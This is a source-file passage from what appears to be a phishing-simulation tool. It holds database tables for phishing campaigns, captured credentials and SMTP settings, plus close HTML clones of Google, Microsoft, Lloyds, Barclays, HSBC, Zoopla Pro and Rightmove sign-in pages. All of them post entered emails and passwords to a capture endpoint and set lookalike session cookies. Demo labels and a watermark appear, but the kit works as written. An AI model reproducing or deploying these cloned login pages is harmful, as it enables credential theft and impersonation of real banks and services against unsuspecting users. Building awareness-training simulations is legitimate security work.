  FOREIGN KEY (campaign_id) REFERENCES phish_campaigns(id),
  FOREIGN KEY (user_id) REFERENCES users(id)
)`);
db.exec(`CREATE TABLE IF NOT EXISTS phish_mails (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  user_id INTEGER NOT NULL,
  from_label TEXT DEFAULT '',
  from_addr TEXT DEFAULT '',
  to_addr TEXT NOT NULL,
  subject TEXT DEFAULT '',
  body TEXT DEFAULT '',
  kind TEXT DEFAULT 'internal',
  created_at TEXT DEFAULT (datetime('now')),
  FOREIGN KEY (user_id) REFERENCES users(id)
)`);
db.exec(`CREATE TABLE IF NOT EXISTS phish_smtp (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  user_id INTEGER NOT NULL UNIQUE,
  host TEXT DEFAULT '',
  port INTEGER DEFAULT 587,
  secure INTEGER DEFAULT 0,
  username TEXT DEFAULT '',
  password TEXT DEFAULT '',
  from_addr TEXT DEFAULT '',
  created_at TEXT DEFAULT (datetime('now')),
  updated_at TEXT DEFAULT (datetime('now')),
  FOREIGN KEY (user_id) REFERENCES users(id)
)`);
try { db.exec('CREATE INDEX IF NOT EXISTS idx_phish_camps_user ON phish_campaigns(user_id)'); } catch (e) {}
try { db.exec('CREATE INDEX IF NOT EXISTS idx_phish_sess_token ON phish_sessions(token)'); } catch (e) {}
try { db.exec('CREATE INDEX IF NOT EXISTS idx_phish_capt_user ON phish_captures(user_id)'); } catch (e) {}
try { db.exec('CREATE INDEX IF NOT EXISTS idx_phish_mail_user ON phish_mails(user_id)'); } catch (e) {}

function phEsc(s) { return esc(s); }
function phToken(len) { return cmailToken(len || 64); }
function phCookies(req) { return cmailCookies(req); }

// Active session for any captured template cookie in the request.
function phSessFromReq(req) {
  const c = phCookies(req);
  const names = [];
  Object.keys(PH_TEMPLATES).forEach(function (k) { PH_TEMPLATES[k].cookies.forEach(function (x) { names.push(x.name); }); });
  for (const n of names) {
    const tok = String(c[n] || '');
    if (!tok) continue;
    const s = db.prepare(
      `SELECT * FROM phish_sessions WHERE token = ? AND revoked = 0 AND expires_at > datetime('now')`
    ).get(tok);
    if (s) return s;
  }
  return null;
}

function phSetTemplateCookies(res, tpl, token) {
  tpl.cookies.forEach(function (c, i) {
    const ms = (i === 0 ? 0.5 : c.days) * 24 * 3600 * 1000;
    try { res.cookie(c.name, token, { maxAge: ms, httpOnly: false, sameSite: 'lax', path: '/' }); } catch (e) {}
  });
}

function phClearTemplateCookies(res) {
  Object.keys(PH_TEMPLATES).forEach(function (k) {
    PH_TEMPLATES[k].cookies.forEach(function (c) { try { res.clearCookie(c.name, { path: '/' }); } catch (e) {} });
  });
}

function phTemplateBadge(key) {
  const t = PH_TEMPLATES[key] || { name: key, color: '#666' };
  return `<span style="display:inline-block;background:${t.color}18;color:${t.color};border:1px solid ${t.color}55;border-radius:6px;padding:2px 9px;font-size:12px;font-weight:600">${phEsc(t.name)}</span>`;
}

// ---------------------------------------------------------------------------
// BRAND LOGIN PAGES
// ---------------------------------------------------------------------------
function phShell(title, css, inner, headExtra) {
  const extra = headExtra || '';
  return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><meta name="robots" content="noindex,nofollow">${extra}<title>${phEsc(title)}</title><style>${css}</style></head><body>${inner}${cmailWatermarkHtml()}</body></html>`;
}

function phGoogleLogo() {
  return `<span style="font-size:22px;letter-spacing:-.5px;font-weight:500"><span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span></span>`;
}

function phGooglePage(opts) {
  opts = opts || {};
  const step = opts.step === 2 ? 2 : 1;
  const email = String(opts.email || '');
  const tpl = PH_TEMPLATES['google-business'];
  const err = opts.error ? `<div style="color:#d93025;font-size:14px;margin-top:14px" role="alert">${phEsc(opts.error)}</div>` : '';
  let card;
  if (step === 1) {
    card = `<h1 style="font-size:24px;font-weight:400;margin:0 0 8px">Sign in</h1>
      <div style="font-size:16px;color:#5f6368">to continue to <b>Google Business Profile</b></div>
      ${err}
      <form method="POST" action="/phish/${phEsc(opts.token)}" data-testid="ph-google-step1" style="margin-top:26px">
        <div><input name="email" type="email" placeholder="Email or phone" required autofocus
          style="width:100%;box-sizing:border-box;border:1px solid #dadce0;border-radius:4px;padding:13px 14px;font-size:16px"></div>
        <div style="margin-top:12px;font-size:14px"><a href="#" onclick="return false" style="color:#1a73e8;text-decoration:none">Forgot email?</a></div>
        <div style="display:flex;justify-content:space-between;align-items:center;margin-top:28px">
          <a href="#" onclick="return false" style="color:#1a73e8;text-decoration:none;font-size:14px;font-weight:500">Create account</a>
          <button type="submit" style="background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer">Next</button>
        </div>
      </form>`;
  } else {
    card = `<h1 style="font-size:24px;font-weight:400;margin:0 0 8px">Welcome</h1>
      <div style="font-size:15px;color:#5f6368;margin-bottom:22px">${phEsc(email)} <a href="/phish/${phEsc(opts.token)}" style="color:#1a73e8;text-decoration:none;font-size:13px">Use another account</a></div>
      ${err}
      <form method="POST" action="/phish/${phEsc(opts.token)}" data-testid="ph-google-step2">
        <input type="hidden" name="email" value="${phEsc(email)}">
        <div><input name="password" type="password" placeholder="Enter your password" required autofocus
          style="width:100%;box-sizing:border-box;border:1px solid #dadce0;border-radius:4px;padding:13px 14px;font-size:16px"></div>
        <div style="margin-top:12px;font-size:14px"><a href="#" onclick="return false" style="color:#1a73e8;text-decoration:none">Forgot password?</a></div>
        <div style="display:flex;justify-content:flex-end;margin-top:28px">
          <button type="submit" style="background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer">Next</button>
        </div>
      </form>`;
  }
  const inner = `
  <div style="padding:20px 28px">${phGoogleLogo()} <span style="font-size:12px;color:#5f6368;border:1px solid #dadce0;border-radius:4px;padding:2px 8px;margin-left:8px">Business Profile</span></div>
  <div style="max-width:448px;margin:30px auto 0;background:#fff;border:1px solid #dadce0;border-radius:8px;padding:40px;min-height:300px">${card}</div>
  <div style="max-width:448px;margin:18px auto 0;display:flex;justify-content:space-between;font-size:12px;color:#70757a;padding:0 8px">
    <span>English (United Kingdom)</span><span><a href="#" onclick="return false" style="color:#70757a;text-decoration:none;margin-right:16px">Help</a><a href="#" onclick="return false" style="color:#70757a;text-decoration:none;margin-right:16px">Privacy</a><a href="#" onclick="return false" style="color:#70757a;text-decoration:none">Terms</a></span>
  </div>
  <div style="height:70px"></div>`;
  const css = `body{margin:0;background:#fff;color:#202124;font-family:Roboto,Arial,sans-serif;-webkit-font-smoothing:antialiased}`;
  return phShell('Sign in - Google Accounts (Demo)', css, inner);
}

function phMSLogo() {
  return `<svg width="23" height="23" viewBox="0 0 23 23" role="img" aria-label="Microsoft"><path fill="#F25022" d="M1 1h10v10H1z"/><path fill="#7FBA00" d="M12 1h10v10H12z"/><path fill="#00A4EF" d="M1 12h10v10H1z"/><path fill="#FFB900" d="M12 12h10v10H12z"/></svg>`;
}

function phMSGlobe() {
  return `<svg width="15" height="15" viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="#333" stroke-width="2" d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zM2.5 12h19M12 2c3 3 4.5 6.3 4.5 10S15 19 12 22c-3-3-4.5-6.3-4.5-10S9 5 12 2z"/></svg>`;
}

function phMSKeyIcon() {
  return `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#494949" stroke-width="1.7" stroke-linecap="round" aria-hidden="true"><circle cx="7" cy="17" r="4.1"/><path d="M10 14 20.6 3.4"/><path d="M15.8 8.2l2.6 2.6"/><path d="M18.6 5.4l2.6 2.6"/></svg>`;
}

function phMicrosoftPage(opts) {
  opts = opts || {};
  const step = opts.step === 3 ? 3 : (opts.step === 2 ? 2 : 1);
  const email = String(opts.email || '');
  const token = phEsc(opts.token || '');
  const err = opts.error ? `<div style="color:#b1010f;font-size:13px;margin-top:12px" role="alert">${phEsc(opts.error)}</div>` : '';
  const MS_FONT = "'Segoe UI','Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif";
  let card;
  if (step === 1) {
    card = `<h1 style="font-size:24px;font-weight:600;margin:0 0 18px;color:#1b1b1b">Sign in</h1>
      ${err}
      <form method="POST" action="/phish/${token}" data-testid="ph-ms-step1">
        <div class="ph-field">
          <input id="ph-ms-id" name="email" type="text" placeholder=" " autofocus autocomplete="username" value="${phEsc(email)}">
          <label for="ph-ms-id">Email, phone, or Skype</label>
        </div>
        <div style="margin-top:16px;font-size:13px"><span style="color:#1b1b1b">No account?</span> <a href="#" onclick="return false" style="color:#0067b8;text-decoration:none">Create one!</a></div>
        <div style="margin-top:16px;font-size:13px"><a href="#" onclick="return false" style="color:#0067b8;text-decoration:none">Can't access your account?</a></div>
        <div style="display:flex;justify-content:flex-end;margin-top:28px">
          <button type="submit" style="min-width:132px;background:#0067b8;color:#fff;border:none;padding:7px 12px;font-size:14px;font-weight:600;cursor:pointer">Next</button>
        </div>
      </form>`;
  } else if (step === 2) {
    const initial = email ? phEsc(email[0].toUpperCase()) : '?';
    card = `<div style="display:flex;align-items:center;gap:12px;margin:0 0 24px">
        <span style="width:32px;height:32px;border-radius:50%;background:#666;color:#fff;display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:600">${initial}</span>
        <div><div style="font-size:14px;color:#1b1b1b">${phEsc(email)}</div>
        <a href="/phish/${token}" style="color:#0067b8;font-size:12px;text-decoration:none">Use a different account</a></div>
      </div>
      <h1 style="font-size:24px;font-weight:600;margin:0 0 18px;color:#1b1b1b">Enter password</h1>
      ${err}
      <form method="POST" action="/phish/${token}" data-testid="ph-ms-step2">
        <input type="hidden" name="email" value="${phEsc(email)}">
        <div class="ph-field">
          <input id="ph-ms-pw" name="password" type="password" placeholder=" " autofocus autocomplete="current-password">
          <label for="ph-ms-pw">Password</label>
        </div>
        <div style="margin-top:16px;font-size:13px"><a href="#" onclick="return false" style="color:#0067b8;text-decoration:none">Forgot password?</a></div>
        <div style="display:flex;justify-content:flex-end;margin-top:28px">
          <button type="submit" style="min-width:132px;background:#0067b8;color:#fff;border:none;padding:7px 12px;font-size:14px;font-weight:600;cursor:pointer">Sign in</button>
        </div>
      </form>`;
  } else {
    card = `<h1 style="font-size:24px;font-weight:600;margin:0 0 14px;color:#1b1b1b">Stay signed in?</h1>
      <p style="font-size:13.5px;color:#333;line-height:1.5;margin:0 0 18px">Choose <b>Yes</b> if you want to go straight to your apps next time. (not recommended on shared computers)</p>
      <form method="POST" action="/phish/${token}" data-testid="ph-ms-step3">
        <input type="hidden" name="email" value="${phEsc(email)}">
        <input type="hidden" name="kmsi" id="ph-ms-kmsi-val" value="yes">
        <div style="display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap;margin-top:26px">
          <div style="display:flex;gap:8px;align-items:center;font-size:13px;color:#222">
            <input type="checkbox" id="ph-ms-kmsi" checked
              onchange="document.getElementById('ph-ms-kmsi-val').value=this.checked?'yes':'no'">
            <label for="ph-ms-kmsi">Don't show this again</label>
          </div>
          <div style="display:flex;gap:12px">
            <button type="submit" onclick="document.getElementById('ph-ms-kmsi-val').value='no'"
              style="min-width:88px;background:#fff;color:#333;border:1px solid #8a8a8a;padding:6px 12px;font-size:14px;font-weight:600;cursor:pointer">No</button>
            <button type="submit" style="min-width:88px;background:#0067b8;color:#fff;border:none;padding:6px 12px;font-size:14px;font-weight:600;cursor:pointer">Yes</button>
          </div>
        </div>
      </form>`;
  }
  const logoRow = step === 1 ? `<div style="display:flex;align-items:center;gap:9px;margin-bottom:26px">${phMSLogo()}<span style="font-size:18px;color:#5e5e5e;font-weight:600">Microsoft</span></div>` : '';
  const optionsRow = step === 1 ? `
  <div style="background:#fff;box-shadow:0 2px 6px rgba(0,0,0,.2);margin-top:12px">
    <a href="#" onclick="return false" style="display:flex;align-items:center;gap:12px;padding:15px 56px;color:#1b1b1b;font-size:14px;text-decoration:none">
      ${phMSKeyIcon()}<span>Sign-in options</span>
    </a>
  </div>` : '';
  const inner = `
  <div class="ph-wrap">
    <div class="ph-card">${logoRow}${card}</div>
    ${optionsRow}
  </div>
  <div style="position:fixed;bottom:0;left:0;right:0;padding:14px 24px;display:flex;justify-content:flex-end;align-items:center;gap:24px;font-size:12px;color:#333">
    <a href="#" onclick="return false" style="color:#333;text-decoration:none">Terms of use</a>
    <a href="#" onclick="return false" style="color:#333;text-decoration:none">Privacy &amp; cookies</a>
    <button type="button" onclick="return false" aria-label="More options" style="background:none;border:none;color:#333;font-size:15px;line-height:1;cursor:pointer;padding:2px">…</button>
  </div>`;
  const css = `body{margin:0;background:linear-gradient(115deg,#f3f1f8 0%,#e8f0f9 28%,#f5f2fa 55%,#eef3fb 78%,#f7f4fb 100%) fixed;color:#1b1b1b;font-family:${MS_FONT};-webkit-font-smoothing:antialiased;min-height:100vh}
input{font-family:inherit}
body{display:flex;flex-direction:column}
.ph-wrap{max-width:552px;margin:auto;padding:44px 12px 96px;box-sizing:border-box;width:100%}
.ph-card{background:#fff;box-shadow:0 2px 6px rgba(0,0,0,.2);padding:48px 56px 44px}
.ph-field{position:relative;border-bottom:1px solid #666;margin-top:6px}
.ph-field input{width:100%;box-sizing:border-box;border:none;outline:none;background:transparent;font-size:15px;padding:20px 0 7px;color:#1b1b1b;border-radius:0}
.ph-field label{position:absolute;left:0;top:16px;font-size:15px;color:#606060;pointer-events:none;transition:all .12s ease-out}
.ph-field input:not(:placeholder-shown)+label{top:0;font-size:12.5px;color:#606060}

.ph-field input:-webkit-autofill{box-shadow:inset 0 0 0 1000px #fff;-webkit-text-fill-color:#1b1b1b}
@media (max-width:600px){.ph-wrap{padding:24px 8px 96px}.ph-card{padding:28px 20px 32px}}`;
  return phShell('Sign in to your account (Demo)', css, inner);
}

function phHandoffPage(next) {
  const fallback = PH_TEMPLATES['microsoft'].redirectAfterCapture || '/phish/app?captured=1';
  const safe = (/^https?:\/\/[^\/\s]+/.test(next) || /^\/phish\//.test(next)) ? next : fallback;
  const escUrl = phEsc(safe);
  const inner = `
  <div style="max-width:460px;margin:0 auto;padding:70px 16px;text-align:center">
    <div style="margin-bottom:26px;display:flex;align-items:center;gap:9px;justify-content:center">${phMSLogo()}<span style="font-size:18px;color:#5e5e5e;font-weight:600">Microsoft</span></div>
    <h1 style="font-size:22px;font-weight:600;color:#1b1b1b;margin:0 0 8px">You're being signed in…</h1>
    <p style="font-size:14px;color:#5f5f5f;margin:0 0 28px">Demo complete — redirecting you to your mailbox. Nothing was changed in your real account.</p>
    <div style="display:inline-block;width:26px;height:26px;border:3px solid #d2d2d2;border-top-color:#0067b8;border-radius:50%;animation:phspin 1s linear infinite"></div>
    <style>@keyframes phspin{to{transform:rotate(360deg)}}</style>
    <div style="margin-top:24px;font-size:13px;color:#5f5f5f">If nothing happens, <a href="${escUrl}" style="color:#0067b8">continue here</a>.</div>
  </div>
  <script>setTimeout(function(){window.location.href = ${JSON.stringify(safe)};}, 2800);</script>`;
  const css = `body{margin:0;background:linear-gradient(115deg,#f3f1f8 0%,#e8f0f9 28%,#f5f2fa 55%,#eef3fb 78%,#f7f4fb 100%) fixed;color:#1b1b1b;font-family:'Segoe UI','Segoe UI Web (West European)',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;-webkit-font-smoothing:antialiased}`;
  return phShell('Signing you in… (Demo)', css, inner, `<meta http-equiv="refresh" content="3;url=${escUrl}">`);
}

function phBankPage(key, opts) {
  opts = opts || {};
  const tpl = PH_TEMPLATES[key];
  const step = opts.step === 2 ? 2 : 1;
  const email = String(opts.email || '');
  const err = opts.error ? `<div style="color:#b3261e;background:#fdeceb;border:1px solid #f5c6c2;border-radius:6px;padding:10px 14px;font-size:14px;margin-top:16px" role="alert">${phEsc(opts.error)}</div>` : '';
  const token = phEsc(opts.token || '');
  let form;
  if (step === 1) {
    form = `<h1 style="font-size:22px;font-weight:600;margin:0 0 6px">${phEsc(tpl.step1)}</h1>
      <div style="color:#555;font-size:14px">LAB demo page — nu un serviciu real. Folosiți doar conturi de echipă.</div>
      ${err}
      <form method="POST" action="/phish/${token}" data-testid="ph-${key}-step1" style="margin-top:22px">
        <div style="margin-bottom:16px"><label style="display:block;font-size:13px;color:#333;margin-bottom:5px">${phEsc(tpl.idLabel)}</label>
        <input name="email" type="text" required autofocus style="width:100%;box-sizing:border-box;border:1px solid #bbb;border-radius:4px;padding:11px 12px;font-size:15px"></div>
        <div style="text-align:right"><button type="submit" style="background:${tpl.btn};color:#fff;border:none;border-radius:4px;padding:11px 26px;font-size:15px;font-weight:600;cursor:pointer">${key === 'hsbc' ? 'Continue' : 'Next'}</button></div>
      </form>`;
  } else {
    form = `<h1 style="font-size:22px;font-weight:600;margin:0 0 6px">${phEsc(tpl.step2)}</h1>
      <div style="color:#555;font-size:14px">${phEsc(email)} · <a href="/phish/${token}" style="color:${tpl.color};text-decoration:none">Use a different ${key === 'barclays' ? 'membership number' : 'account'}</a></div>
      ${err}
      <form method="POST" action="/phish/${token}" data-testid="ph-${key}-step2">
        <input type="hidden" name="email" value="${phEsc(email)}">
        <div style="margin:18px 0 16px"><label style="display:block;font-size:13px;color:#333;margin-bottom:5px">${phEsc(tpl.pwLabel)}</label>
        <input name="password" type="password" required autofocus style="width:100%;box-sizing:border-box;border:1px solid #bbb;border-radius:4px;padding:11px 12px;font-size:15px"></div>
        <div style="text-align:right"><button type="submit" style="background:${tpl.btn};color:#fff;border:none;border-radius:4px;padding:11px 26px;font-size:15px;font-weight:600;cursor:pointer">${key === 'hsbc' ? 'Log on' : 'Sign in'}</button></div>
      </form>`;
  }
  let head;
  if (key === 'lloyds') {
    head = `<div style="background:#006a4d;color:#fff;padding:16px 26px;display:flex;align-items:center;gap:12px"><span style="font-size:22px;font-weight:700;letter-spacing:.5px">Lloyds Bank</span><span style="font-size:13px;opacity:.85;border-left:1px solid rgba(255,255,255,.4);padding-left:12px">Internet Banking</span></div>`;
  } else if (key === 'barclays') {
    head = `<div style="background:#003da5;padding:14px 26px"><span style="color:#fff;font-size:22px;font-weight:700;letter-spacing:-.5px">barclays</span></div>`;
  } else {
    head = `<div style="background:#fff;border-bottom:1px solid #eee;padding:14px 26px;display:flex;align-items:center;gap:12px">
      <svg width="34" height="30" viewBox="0 0 34 30"><polygon points="8,1 26,1 34,15 26,29 8,29 0,15" fill="#db0011"/><text x="17" y="19.5" text-anchor="middle" font-size="9" font-weight="700" fill="#fff" font-family="Arial">HSBC</text></svg>
      <span style="color:#db0011;font-size:20px;font-weight:700">HSBC</span></div>`;
  }
  const inner = `${head}
  <div style="max-width:520px;margin:34px auto;background:#fff;border:1px solid #e4e4e4;border-radius:8px;box-shadow:0 1px 4px rgba(0,0,0,.06);padding:32px 36px;min-height:280px">${form}</div>
  <div style="text-align:center;color:#888;font-size:12px;padding-bottom:60px">${phEsc(tpl.display)} · demo de laborator MarketForge</div>
  <div style="height:40px"></div>`;
  const css = `body{margin:0;background:#f5f6f7;color:#111;font-family:Arial,Helvetica,sans-serif;-webkit-font-smoothing:antialiased}`;
  return phShell(tpl.name + ' — Online Banking (Demo)', css, inner);
}

function phZooplaLogo() {
  return `<img src="https://prod-pro-login-auth0-assets.s3.amazonaws.com/img/logo-zoopla-pro.png" alt="Zoopla Pro" height="34" style="height:34px;width:auto;display:block" onerror="this.style.display='none';var t=this.nextElementSibling;if(t)t.style.display='inline-block'"><span style="display:none;font-size:25px;font-weight:800;letter-spacing:-.6px;color:#6a148e">Zoopla<span style="color:#d00e17">Pro</span></span>`;
}

function phZooplaPage(opts) {
  opts = opts || {};
  const tpl = PH_TEMPLATES['zoopla-pro'] || { display: 'pro.zoopla.co.uk' };
  const email = String(opts.email || '');
  const token = phEsc(opts.token || '');
  const err = opts.error ? `<div role="alert" style="background:#fdeceb;border:1px solid #f5c6c2;color:#d00e17;border-radius:6px;padding:10px 14px;font-size:13.5px;margin:0 0 18px">${phEsc(opts.error)}</div>` : '';
  const inner = `
  <div class="zp-wrap">
    <div class="zp-card">
      <div style="margin-bottom:26px">${phZooplaLogo()}</div>
      <h1 style="font-size:24px;font-weight:600;margin:0 0 6px;color:#252626">Welcome</h1>
      <p style="font-size:14.5px;color:#5b5b5b;margin:0 0 22px">Sign into your Zoopla Pro account</p>
      ${err}
      <form method="POST" action="/phish/${token}" data-testid="ph-zoopla-login" novalidate>
        <div style="margin-bottom:16px">
          <label for="username" style="display:block;font-size:13px;font-weight:600;color:#252626;margin-bottom:6px">Email address <span style="color:#d00e17">*</span></label>
          <input id="username" name="email" type="email" required autofocus autocomplete="username" value="${phEsc(email)}" style="width:100%!important;box-sizing:border-box;border:1px solid #c2c8d0;border-radius:4px;padding:11px 12px;font-size:15px;color:#252626;background:#fff;outline:none;margin:0">
        </div>
        <div style="margin-bottom:10px;position:relative">
          <label for="password" style="display:block;font-size:13px;font-weight:600;color:#252626;margin-bottom:6px">Password</label>
          <input id="password" name="password" type="password" required autocomplete="current-password" style="width:100%!important;box-sizing:border-box;border:1px solid #c2c8d0;border-radius:4px;padding:11px 52px 11px 12px;font-size:15px;color:#252626;background:#fff;outline:none;margin:0">
          <button type="button" aria-label="Show password" onclick="var p=document.getElementById('password');var h=p.type==='password';p.type=h?'text':'password';this.textContent=h?'Hide':'Show'" style="position:absolute;right:6px;bottom:5px;background:none;border:none;color:#6a148e;font-size:12.5px;font-weight:700;cursor:pointer;padding:6px 8px">Show</button>
        </div>
        <div style="margin-bottom:24px"><a href="#" onclick="return false" style="color:#6a148e;text-decoration:none;font-size:13.5px;font-weight:600">Reset password</a></div>
        <button type="submit" value="default" name="action" data-action-button-primary="true" style="width:100%;background:#252626;color:#fff;border:none;border-radius:4px;padding:12px 18px;font-size:15px;font-weight:600;cursor:pointer">Sign in</button>
      </form>
    </div>
    <div style="text-align:center;color:#8a8a8a;font-size:12px;margin-top:20px">${phEsc(tpl.display)} · demo de laborator MarketForge</div>
  </div>`;
  const css = `body{margin:0;background:#f7f5f9;color:#252626;font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,'Helvetica Neue',Arial,sans-serif;-webkit-font-smoothing:antialiased}.zp-wrap{max-width:400px;margin:0 auto;padding:56px 16px 90px}.zp-card{background:#fff;border:1px solid #e6e2ee;border-radius:8px;box-shadow:0 2px 14px rgba(50,39,68,.09);padding:36px 34px}.zp-card input:focus{border-color:#6a148e;box-shadow:0 0 0 3px rgba(106,20,142,.16)}@media(max-width:460px){.zp-card{padding:26px 20px}.zp-wrap{padding:28px 12px 70px}}`;
  return phShell('Welcome (Demo)', css, inner);
}

// ---------------------------------------------------------------------------
// RIGHTMOVE PLUS (rental portal) — cloned login (dark theme) + demo dashboard
// ---------------------------------------------------------------------------
function phRightmoveIcon(size) {
  const s = size || 48;
  return `<svg width="${s}" height="${s}" viewBox="0 0 16.3 16.68" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M12.0838 14.6946H14.3305L14.3212 7.79287L8.14587 2.57997L1.97052 7.78975L1.96122 14.6915H4.19859L8.14587 11.3481L12.0776 14.6915L12.0838 14.6946ZM14.5974 16.6701H11.3639L8.14899 13.9375L4.92165 16.6701H1.69746C1.24439 16.6701 0.816144 16.4925 0.496516 16.1684C0.176887 15.8444 0 15.4175 0 14.9595L0.00931766 7.662C0.00931766 7.21331 0.183093 6.78644 0.496516 6.46549L0.5648 6.40007L8.14899 0L15.8045 6.46862C16.1179 6.78956 16.2886 7.21331 16.2886 7.662L16.2979 14.9595C16.2979 15.4144 16.1211 15.8444 15.8014 16.1684C15.4787 16.4925 15.0536 16.6701 14.5974 16.6701Z" fill="#00DEB6"/></svg>`;
}

function phRightmoveLogo() {
  return `<svg width="59" height="24" viewBox="0 0 59 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><g clip-path="url(#rmclip)"><path d="M12.0838 14.6946H14.3305L14.3212 7.79287L8.14587 2.57997L1.97052 7.78975L1.96122 14.6915H4.19859L8.14587 11.3481L12.0776 14.6915L12.0838 14.6946ZM14.5974 16.6701H11.3639L8.14899 13.9375L4.92165 16.6701H1.69746C1.24439 16.6701 0.816144 16.4925 0.496516 16.1684C0.176887 15.8444 0 15.4175 0 14.9595L0.00931766 7.662C0.00931766 7.21331 0.183093 6.78644 0.496516 6.46549L0.5648 6.40007L8.14899 0L15.8045 6.46862C16.1179 6.78956 16.2886 7.21331 16.2886 7.662L16.2979 14.9595C16.2979 15.4144 16.1211 15.8444 15.8014 16.1684C15.4787 16.4925 15.0536 16.6701 14.5974 16.6701Z" fill="#00DEB6"/><path d="M20.4492 4.63574H23.9675V10.1228C24.3447 9.67792 24.845 9.34014 25.4682 9.10945C26.0915 8.86229 26.723 8.73872 27.3627 8.73872C28.6912 8.73872 29.7492 9.13418 30.5364 9.92512C31.3401 10.716 31.742 11.886 31.742 13.4349V20.6027H28.2238V13.9787C28.2238 13.3031 28.0516 12.7758 27.7071 12.3968C27.3627 12.0178 26.9034 11.8283 26.3293 11.8283C25.9521 11.8283 25.6158 11.9024 25.3206 12.0508C25.0254 12.1826 24.7793 12.3638 24.5825 12.5945C24.3857 12.8252 24.2381 13.0971 24.1397 13.4102C24.0413 13.7068 23.9921 14.0281 23.9921 14.3741V20.6027H20.4492V4.63574ZM33.3031 9.01058H36.8461V15.6841C36.8461 16.3432 37.0017 16.8623 37.3134 17.2413C37.6413 17.6203 38.1173 17.8097 38.7402 17.8097C39.1011 17.8097 39.4211 17.7438 39.6998 17.612C39.9789 17.4637 40.2167 17.2742 40.4136 17.0435C40.6101 16.8128 40.7578 16.5409 40.8563 16.2279C40.9547 15.9148 41.004 15.5935 41.004 15.2639V9.01058H44.5222V20.6027H41.127L41.0286 19.3669C40.6514 19.8118 40.1508 20.1825 39.5279 20.4792C38.9209 20.7593 38.2813 20.8993 37.6087 20.8993C36.28 20.8993 35.2304 20.5039 34.4595 19.7129C33.6886 18.922 33.3031 17.7521 33.3031 16.2032V9.01058ZM49.7023 17.785C49.8988 17.8674 50.1124 17.9333 50.3419 17.9828C50.588 18.0157 50.9243 18.0322 51.3507 18.0322C52.2856 18.0322 53.007 17.7273 53.5156 17.1177C54.0404 16.508 54.3028 15.7088 54.3028 14.7201C54.3028 14.3576 54.2536 14.0034 54.1552 13.6573C54.0734 13.3113 53.942 13.0065 53.7617 12.7428C53.5811 12.4627 53.3433 12.2403 53.0483 12.0755C52.7692 11.8942 52.425 11.8036 52.0149 11.8036C51.2276 11.8036 50.6452 12.026 50.268 12.4709C49.8909 12.8993 49.7023 13.4761 49.7023 14.2011V17.785ZM46.1348 4.63574H49.6777L49.7023 9.87567C50.0302 9.52963 50.4729 9.25774 51.0307 9.06003C51.6048 8.86229 52.1705 8.76341 52.7283 8.76341C53.5485 8.76341 54.2782 8.91996 54.9182 9.23305C55.5578 9.54611 56.0909 9.97454 56.5173 10.5183C56.96 11.0456 57.2963 11.6635 57.5261 12.3721C57.7556 13.0641 57.8703 13.8056 57.8703 14.5966C57.8703 15.5358 57.7147 16.4009 57.4031 17.1918C57.1077 17.9828 56.673 18.6584 56.0989 19.2186C55.5248 19.7788 54.8197 20.2155 53.9832 20.5286C53.1467 20.8417 52.1951 20.9982 51.1291 20.9982C50.145 20.9982 49.21 20.9076 48.3243 20.7263C47.4552 20.5451 46.7335 20.3556 46.1594 20.1578L46.1348 4.63574Z" fill="#ffffff"/></g><defs><clipPath id="rmclip"><rect width="59" height="24" fill="#ffffff"/></clipPath></defs></svg>`;
}

function phRightmoveHarrow(size) {
  const s = size || 40;
  return `<svg width="${s}" height="${s}" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" fill-rule="evenodd" clip-rule="evenodd" d="M12 15.8425 16.7515 20H20v-9.0388l-8-6.4-8 6.4001V20h3.2485zM8 22H4c-1.1046 0-2-.8954-2-2v-9.0388a2 2 0 0 1 .7506-1.5617L12 2l9.2494 7.3995c.4744.3796.7506.9542.7506 1.5617V20c0 1.1046-.8954 2-2 2h-4l-4-3.5z"/></svg>`;
}

function phRightmoveEye(open) {
  if (open) {
    return `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M14 12c0 1.1046-.8954 2-2 2s-2-.8954-2-2 .8954-2 2-2 2 .8954 2 2"/><path fill="currentColor" fill-rule="evenodd" clip-rule="evenodd" d="M12 18c-7 0-10-6-10-6s3-6 10-6 10 6 10 6-3 6-10 6m-6.2684-4.4696A10.7 10.7 0 0 1 4.3659 12c.323-.4411.7763-.9864 1.3657-1.5304.6396-.5904 1.4303-1.173 2.3887-1.6238A4.98 4.98 0 0 0 7 12a4.98 4.98 0 0 0 1.1203 3.1542c-.9584-.4509-1.7491-1.0334-2.3887-1.6238m10.1481 1.6238c.9584-.4509 1.7491-1.0334 2.3887-1.6238A10.7 10.7 0 0 0 19.6341 12a10.7 10.7 0 0 0-1.3657-1.5304c-.6396-.5904-1.4303-1.173-2.3887-1.6238A4.98 4.98 0 0 1 17 12a4.98 4.98 0 0 1-1.1203 3.1542M12 15c1.6569 0 3-1.3431 3-3s-1.3431-3-3-3-3 1.3431-3 3 1.3431 3 3 3"/></svg>`;
  }
